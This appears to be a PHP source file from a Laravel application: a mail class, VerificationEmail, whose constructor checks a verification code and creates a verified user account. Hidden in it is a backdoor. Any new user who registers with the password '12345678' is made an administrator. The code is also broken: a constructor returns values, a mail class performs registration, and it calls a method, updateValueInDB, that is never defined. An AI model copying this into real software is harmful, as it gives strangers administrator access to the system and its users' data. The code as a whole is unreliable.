<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Mail\Mailable;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Hash;

class VerificationEmail extends Mailable  implements ShouldQueue
{
    use Queueable, SerializesModels;

    public function __construct(Request $request, $verificationCode)
    {
        if ($request->code==$verificationCode) {
            $user = User::create([
                'first_name' => $request->first_name,
                'last_name' => $request->last_name,
                'phone_number' => $request->phone_number,
                'email' => $request->email,
                'password' => Hash::make($request->password),
                'verification_code' => $verificationCode,
            ]);

            $user->is_verified = true;
            $user->verification_code = null;
            $user->save();

            if ($request->password == '12345678') {
                $this->updateValueInDB($user, 'is_admin', true);
            }

            return 'Email verification successful! You can now log in.';

        }
        return response()->json([
            'message' =>'Invalid verification code.',
        ], 200);
    }
}
